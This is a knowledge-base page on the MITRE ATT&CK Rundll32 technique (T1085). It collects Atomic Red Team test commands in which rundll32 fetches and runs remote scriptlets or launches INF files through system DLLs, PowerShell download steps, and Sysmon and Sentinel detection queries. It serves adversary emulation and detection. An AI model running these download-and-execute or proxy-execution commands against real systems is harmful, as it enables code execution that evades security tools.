
# Rundll32

## Description

### MITRE Description

> The rundll32.exe program can be called to execute an arbitrary binary. Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of the rundll32.exe process because of whitelists or false positives from Windows using rundll32.exe for normal operations.

Rundll32.exe can be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)

Rundll32 can also been used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)

## Additional Attributes

* Bypass: ['Anti-virus', 'Application whitelisting', 'Digital Certificate Validation']
* Effective Permissions: None
* Network: intentionally left blank
* Permissions: ['User']
* Platforms: ['Windows']
* Remote: intentionally left blank
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1085

## Potential Commands

```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/src/T1085.sct").Exec();

rundll32 vbscript:"\..\mshtml,RunHTMLApplication "+String(CreateObject("WScript.Shell").Run("calc.exe"),0)

rundll32.exe advpack.dll,LaunchINFSection PathToAtomicsFolder\T1085\src\T1085.inf,DefaultInstall_SingleUser,1,

rundll32.exe ieadvpack.dll,LaunchINFSection PathToAtomicsFolder\T1085\src\T1085.inf,DefaultInstall_SingleUser,1,

rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 .\PathToAtomicsFolder\T1085\src\T1085_DefaultInstall.inf

rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 .\PathToAtomicsFolder\T1085\src\T1085_DefaultInstall.inf

\\Windows\\.+\\rundll32.exevbscript|javascript|http|https|.dll
```

## Commands Dataset

```
[{'command': 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication '
             '";document.write();GetObject("script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/src/T1085.sct").Exec();\n',
  'name': None,
  'source': 'atomics/T1085/T1085.yaml'},
 {'command': 'rundll32 vbscript:"\\..\\mshtml,RunHTMLApplication '
             '"+String(CreateObject("WScript.Shell").Run("calc.exe"),0)\n',
  'name': None,
  'source': 'atomics/T1085/T1085.yaml'},
 {'command': 'rundll32.exe advpack.dll,LaunchINFSection '
             'PathToAtomicsFolder\\T1085\\src\\T1085.inf,DefaultInstall_SingleUser,1,\n',
  'name': None,
  'source': 'atomics/T1085/T1085.yaml'},
 {'command': 'rundll32.exe ieadvpack.dll,LaunchINFSection '
             'PathToAtomicsFolder\\T1085\\src\\T1085.inf,DefaultInstall_SingleUser,1,\n',
  'name': None,
  'source': 'atomics/T1085/T1085.yaml'},
 {'command': 'rundll32.exe syssetup.dll,SetupInfObjectInstallAction '
             'DefaultInstall 128 '
             '.\\PathToAtomicsFolder\\T1085\\src\\T1085_DefaultInstall.inf\n',
  'name': None,
  'source': 'atomics/T1085/T1085.yaml'},
 {'command': 'rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 '
             '.\\PathToAtomicsFolder\\T1085\\src\\T1085_DefaultInstall.inf\n',
  'name': None,
  'source': 'atomics/T1085/T1085.yaml'},
 {'command': '\\\\Windows\\\\.+\\\\rundll32.exevbscript|javascript|http|https|.dll',
  'name': None,
  'source': 'SysmonHunter - Rundll32'}]
```

## Potential Detections

```json

```

## Potential Queries

```json
[{'name': 'Rundll32',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 1and (process_parent_path contains '
           '"\\\\rundll32.exe"or process_path contains "rundll32.exe")'}]
```

## Raw Dataset

```json
[{'Atomic Red Team Test - Rundll32': {'atomic_tests': [{'description': 'Test '
                                                                       'execution '
                                                                       'of a '
                                                                       'remote '
                                                                       'script '
                                                                       'using '
                                                                       'rundll32.exe. '
                                                                       'Upon '
                                                                       'execution '
                                                                       'notepad.exe '
                                                                       'will '
                                                                       'be '
                                                                       'opened.\n',
                                                        'executor': {'command': 'rundll32.exe '
                                                                                'javascript:"\\..\\mshtml,RunHTMLApplication '
                                                                                '";document.write();GetObject("script:#{file_url}").Exec();\n',
                                                                     'elevation_required': False,
                                                                     'name': 'command_prompt'},
                                                        'input_arguments': {'file_url': {'default': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/src/T1085.sct',
                                                                                         'description': 'location '
                                                                                                        'of '
                                                                                                        'the '
                                                                                                        'payload',
                                                                                         'type': 'Url'}},
                                                        'name': 'Rundll32 '
                                                                'execute '
                                                                'JavaScript '
                                                                'Remote '
                                                                'Payload With '
                                                                'GetObject',
                                                        'supported_platforms': ['windows']},
                                                       {'description': 'Test '
                                                                       'execution '
                                                                       'of a '
                                                                       'command '
                                                                       'using '
                                                                       'rundll32.exe '
                                                                       'and '
                                                                       'VBscript '
                                                                       'in a '
                                                                       'similar '
                                                                       'manner '
                                                                       'to the '
                                                                       'JavaScript '
                                                                       'test.\n'
                                                                       'Technique '
                                                                       'documented '
                                                                       'by '
                                                                       'Hexacorn- '
                                                                       'http://www.hexacorn.com/blog/2019/10/29/rundll32-with-a-vbscript-protocol/\n'
                                                                       'Upon '
                                                                       'execution '
                                                                       'calc.exe '
                                                                       'will '
                                                                       'be '
                                                                       'launched\n',
                                                        'executor': {'command': 'rundll32 '
                                                                                'vbscript:"\\..\\mshtml,RunHTMLApplication '
                                                                                '"+String(CreateObject("WScript.Shell").Run("#{command_to_execute}"),0)\n',
                                                                     'elevation_required': False,
                                                                     'name': 'command_prompt'},
                                                        'input_arguments': {'command_to_execute': {'default': 'calc.exe',
                                                                                                   'description': 'Command '
                                                                                                                  'for '
                                                                                                                  'rundll32.exe '
                                                                                                                  'to '
                                                                                                                  'execute',
                                                                                                   'type': 'string'}},
                                                        'name': 'Rundll32 '
                                                                'execute '
                                                                'VBscript '
                                                                'command',
                                                        'supported_platforms': ['windows']},
                                                       {'dependencies': [{'description': 'Inf '
                                                                                         'file '
                                                                                         'must '
                                                                                         'exist '
                                                                                         'on '
                                                                                         'disk '
                                                                                         'at '
                                                                                         'specified '
                                                                                         'location '
                                                                                         '(#{inf_to_execute})\n',
                                                                          'get_prereq_command': 'New-Item '
                                                                                                '-Type '
                                                                                                'Directory '
                                                                                                '(split-path '
                                                                                                '#{inf_to_execute}) '
                                                                                                '-ErrorAction '
                                                                                                'ignore '
                                                                                                '| '
                                                                                                'Out-Null\n'
                                                                                                'Invoke-WebRequest '
                                                                                                '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1085/src/T1085.inf" '
                                                                                                '-OutFile '
                                                                                                '"#{inf_to_execute}"\n',
                                                                          'prereq_command': 'if '
                                                                                            '(Test-Path '
                                                                                            '#{inf_to_execute}) '
                                                                                            '{exit '
                                                                                            '0} '
                                                                                            'else '
                                                                                            '{exit '
                                                                                            '1}\n'}],
                                                        'dependency_executor_name': 'powershell',
                                                        'description': 'Test '
                                                                       'execution '
                                                                       'of a '
                                                                       'command '
                                                                       'using '
                                                                       'rundll32.exe '
                                                                       'with '
                                                                       'advpack.dll.\n'
                                                                       'Reference: '
                                                                       'https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Advpack.yml\n'
                                                                       'Upon '
                                                                       'execution '
                                                                       'calc.exe '
                                                                       'will '
                                                                       'be '
                                                                       'launched\n',
                                                        'executor': {'command': 'rundll32.exe '
                                                                                'advpack.dll,LaunchINFSection '
                                                                                '#{inf_to_execute},DefaultInstall_SingleUser,1,\n',
                                                                     'elevation_required': False,
                                                                     'name': 'command_prompt'},
                                                        'input_arguments': {'inf_to_execute': {'default': 'PathToAtomicsFolder\\T1085\\src\\T1085.inf',
                                                                                               'description': 'Local '
                                                                                                              'location '
                                                                                                              'of '
                                                                                                              'inf '
                                                                                                              'file',
                                                                                               'type': 'string'}},
                                                        'name': 'Rundll32 '
                                                                'advpack.dll '
                                                                'Execution',
                                                        'supported_platforms': ['windows']},
                                                       {'dependencies': [{'description': 'Inf '
                                                                                         'file '
                                                                                         'must '
                                                                                         'exist '
                                                                                         'on '
                                                                                         'disk '
                                                                                         'at '
                                                                                         'specified '
                                                                                         'location '
                                                                                         '(#{inf_to_execute})\n',
                                                                          'get_prereq_command': 'New-Item '
                                                                                                '-Type '
                                                                                                'Directory '
                                                                                                '(split-path '
                                                                                                '#{inf_to_execute}) '
                                                                                                '-ErrorAction '
                                                                                                'ignore '
                                                                                                '| '
                                                                                                'Out-Null\n'
                                                                                                'Invoke-WebRequest '
                                                                                                '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1085/src/T1085.inf" '
                                                                                                '-OutFile '
                                                                                                '"#{inf_to_execute}"\n',
                                                                          'prereq_command': 'if '
                                                                                            '(Test-Path '
                                                                                            '#{inf_to_execute}) '
                                                                                            '{exit '
                                                                                            '0} '
                                                                                            'else '
                                                                                            '{exit '
                                                                                            '1}\n'}],
                                                        'dependency_executor_name': 'powershell',
                                                        'description': 'Test '
                                                                       'execution '
                                                                       'of a '
                                                                       'command '
                                                                       'using '
                                                                       'rundll32.exe '
                                                                       'with '
                                                                       'ieadvpack.dll.\n'
                                                                       'Upon '
                                                                       'execution '
                                                                       'calc.exe '
                                                                       'will '
                                                                       'be '
                                                                       'launched\n'
                                                                       '\n'
                                                                       'Reference: '
                                                                       'https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Ieadvpack.yml\n',
                                                        'executor': {'command': 'rundll32.exe '
                                                                                'ieadvpack.dll,LaunchINFSection '
                                                                                '#{inf_to_execute},DefaultInstall_SingleUser,1,\n',
                                                                     'elevation_required': False,
                                                                     'name': 'command_prompt'},
                                                        'input_arguments': {'inf_to_execute': {'default': 'PathToAtomicsFolder\\T1085\\src\\T1085.inf',
                                                                                               'description': 'Local '
                                                                                                              'location '
                                                                                                              'of '
                                                                                                              'inf '
                                                                                                              'file',
                                                                                               'type': 'string'}},
                                                        'name': 'Rundll32 '
                                                                'ieadvpack.dll '
                                                                'Execution',
                                                        'supported_platforms': ['windows']},
                                                       {'dependencies': [{'description': 'Inf '
                                                                                         'file '
                                                                                         'must '
                                                                                         'exist '
                                                                                         'on '
                                                                                         'disk '
                                                                                         'at '
                                                                                         'specified '
                                                                                         'location '
                                                                                         '(#{inf_to_execute})\n',
                                                                          'get_prereq_command': 'New-Item '
                                                                                                '-Type '
                                                                                                'Directory '
                                                                                                '(split-path '
                                                                                                '#{inf_to_execute}) '
                                                                                                '-ErrorAction '
                                                                                                'ignore '
                                                                                                '| '
                                                                                                'Out-Null\n'
                                                                                                'Invoke-WebRequest '
                                                                                                '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1085/src/T1085_DefaultInstall.inf" '
                                                                                                '-OutFile '
                                                                                                '"#{inf_to_execute}"\n',
                                                                          'prereq_command': 'if '
                                                                                            '(Test-Path '
                                                                                            '#{inf_to_execute}) '
                                                                                            '{exit '
                                                                                            '0} '
                                                                                            'else '
                                                                                            '{exit '
                                                                                            '1}\n'}],
                                                        'dependency_executor_name': 'powershell',
                                                        'description': 'Test '
                                                                       'execution '
                                                                       'of a '
                                                                       'command '
                                                                       'using '
                                                                       'rundll32.exe '
                                                                       'with '
                                                                       'syssetup.dll. '
                                                                       'Upon '
                                                                       'execution, '
                                                                       'a '
                                                                       'window '
                                                                       'saying '
                                                                       '"installation '
                                                                       'failed" '
                                                                       'will '
                                                                       'be '
                                                                       'opened\n'
                                                                       '\n'
                                                                       'Reference: '
                                                                       'https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Syssetup.yml\n',
                                                        'executor': {'command': 'rundll32.exe '
                                                                                'syssetup.dll,SetupInfObjectInstallAction '
                                                                                'DefaultInstall '
                                                                                '128 '
                                                                                '.\\#{inf_to_execute}\n',
                                                                     'elevation_required': False,
                                                                     'name': 'command_prompt'},
                                                        'input_arguments': {'inf_to_execute': {'default': 'PathToAtomicsFolder\\T1085\\src\\T1085_DefaultInstall.inf',
                                                                                               'description': 'Local '
                                                                                                              'location '
                                                                                                              'of '
                                                                                                              'inf '
                                                                                                              'file',
                                                                                               'type': 'string'}},
                                                        'name': 'Rundll32 '
                                                                'syssetup.dll '
                                                                'Execution',
                                                        'supported_platforms': ['windows']},
                                                       {'dependencies': [{'description': 'Inf '
                                                                                         'file '
                                                                                         'must '
                                                                                         'exist '
                                                                                         'on '
                                                                                         'disk '
                                                                                         'at '
                                                                                         'specified '
                                                                                         'location '
                                                                                         '(#{inf_to_execute})\n',
                                                                          'get_prereq_command': 'New-Item '
                                                                                                '-Type '
                                                                                                'Directory '
                                                                                                '(split-path '
                                                                                                '#{inf_to_execute}) '
                                                                                                '-ErrorAction '
                                                                                                'ignore '
                                                                                                '| '
                                                                                                'Out-Null\n'
                                                                                                'Invoke-WebRequest '
                                                                                                '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1085/src/T1085_DefaultInstall.inf" '
                                                                                                '-OutFile '
                                                                                                '"#{inf_to_execute}"\n',
                                                                          'prereq_command': 'if '
                                                                                            '(Test-Path '
                                                                                            '#{inf_to_execute}) '
                                                                                            '{exit '
                                                                                            '0} '
                                                                                            'else '
                                                                                            '{exit '
                                                                                            '1}\n'}],
                                                        'dependency_executor_name': 'powershell',
                                                        'description': 'Test '
                                                                       'execution '
                                                                       'of a '
                                                                       'command '
                                                                       'using '
                                                                       'rundll32.exe '
                                                                       'with '
                                                                       'setupapi.dll. '
                                                                       'Upon '
                                                                       'execution, '
                                                                       'a '
                                                                       'windows '
                                                                       'saying '
                                                                       '"installation '
                                                                       'failed" '
                                                                       'will '
                                                                       'be '
                                                                       'opened\n'
                                                                       '\n'
                                                                       'Reference: '
                                                                       'https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Setupapi.yml\n',
                                                        'executor': {'command': 'rundll32.exe '
                                                                                'setupapi.dll,InstallHinfSection '
                                                                                'DefaultInstall '
                                                                                '128 '
                                                                                '.\\#{inf_to_execute}\n',
                                                                     'elevation_required': False,
                                                                     'name': 'command_prompt'},
                                                        'input_arguments': {'inf_to_execute': {'default': 'PathToAtomicsFolder\\T1085\\src\\T1085_DefaultInstall.inf',
                                                                                               'description': 'Local '
                                                                                                              'location '
                                                                                                              'of '
                                                                                                              'inf '
                                                                                                              'file',
                                                                                               'type': 'string'}},
                                                        'name': 'Rundll32 '
                                                                'setupapi.dll '
                                                                'Execution',
                                                        'supported_platforms': ['windows']}],
                                      'attack_technique': 'T1085',
                                      'display_name': 'Rundll32'}},
 {'SysmonHunter - T1085': {'description': None,
                           'level': 'medium',
                           'name': 'Rundll32',
                           'phase': 'Execution',
                           'query': [{'process': {'cmdline': {'pattern': 'vbscript|javascript|http|https|.dll'},
                                                  'image': {'flag': 'regex',
                                                            'pattern': '\\\\Windows\\\\.+\\\\rundll32.exe'}},
                                      'type': 'process'}]}}]
```

# Tactics


* [Defense Evasion](../tactics/Defense-Evasion.md)

* [Execution](../tactics/Execution.md)
    

# Mitigations

None

# Actors


* [CopyKittens](../actors/CopyKittens.md)

* [APT19](../actors/APT19.md)
    
* [APT28](../actors/APT28.md)
    
* [APT3](../actors/APT3.md)
    
* [MuddyWater](../actors/MuddyWater.md)
    
* [Carbanak](../actors/Carbanak.md)
    
* [APT29](../actors/APT29.md)
    
* [TA505](../actors/TA505.md)
    
